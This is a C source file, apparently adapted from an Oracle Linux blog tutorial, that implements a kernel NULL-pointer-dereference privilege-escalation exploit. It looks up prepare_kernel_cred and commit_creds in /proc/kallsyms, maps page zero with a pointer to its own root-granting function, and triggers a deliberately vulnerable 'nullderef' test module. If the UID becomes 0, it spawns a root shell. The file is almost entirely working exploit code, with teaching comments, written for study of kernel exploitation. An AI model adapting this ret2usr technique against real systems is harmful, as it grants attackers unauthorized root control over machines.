// Source: https://blogs.oracle.com/linux/much-ado-about-null%3a-exploiting-a-kernel-null-dereference-v2
// Minor modifications to clear compiler warnings and tweak code style.

#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

struct cred;
struct task_struct;
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct * daemon)
    __attribute__ ((regparm(3)));
typedef int (*commit_creds_t) (struct cred * new) __attribute__ ((regparm(3)));
prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

/* Find a kernel symbol in /proc/kallsyms */
void *get_ksym(char *name) {
    /* read /proc/kallsyms file using fopen() (flag r denotes read mod
       flag b reads file as a binary file). Store the FILE pointer returned
       in pointer f. */
    FILE *f = fopen("/proc/kallsyms", "rb");
    /* declare char var c to store symbol type
       and char array (size 512 bytes) to store symbols in /proc/kallsyms */
    char c, sym[512];
    /* declare void pointer addr to store addresses of symbols */
    void *addr;

    /* scan the /proc/kallsysms file and read the data as the format 
       specified in arg 2. Store the data, according to the format 
       in the addr, c and sym variables
       loop until there is still data in the file that can be assigned 
       to the specified format
    */
    while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
        /* if the name supplied to get_ksym function matches
           a sym from /proc/kallsyms... */
        if (!strcmp(sym, name))
            /* ...return the address of the symbol */
            return addr;
    /* if you cannot find any symbol that matches name in /proc/kallsyms
       return NULL */
    return NULL;
}

/* This function will be executed in kernel mode. */
void get_root(void) {
    /* commit_creds takes struct cred returned by prepare_kernel_cred
       (that has full privileges) and applies it to the current process
       thereby giving it us, the user, full permissions */
    commit_creds(prepare_kernel_cred(0));
}

int main() {
    prepare_kernel_cred = get_ksym("prepare_kernel_cred");
    commit_creds = get_ksym("commit_creds");

    if (!(prepare_kernel_cred && commit_creds)) {
        fprintf(stderr,
                "Kernel symbols not found. "
                "Is your kernel older than 2.6.29?\n");
    }                       /* Put a pointer to our function at NULL */

    mmap(0, 4096, PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    void (**fn) (void) = NULL;
    *fn = get_root;         /* Trigger the kernel */

    printf("UID before: %d\n", getuid());

    int fd = open("/sys/module/nullderef/parameters/call", O_RDONLY);
    char tmp[10];
    read(fd, tmp, 1);
    close(fd);

    printf("UID after: %d\n", getuid());

    if (getuid() == 0) {
        char *argv[] = { "/bin/sh", NULL };
        execve("/bin/sh", argv, NULL);
    }

    fprintf(stderr, "Something went wrong?\n");

    return 1;
}
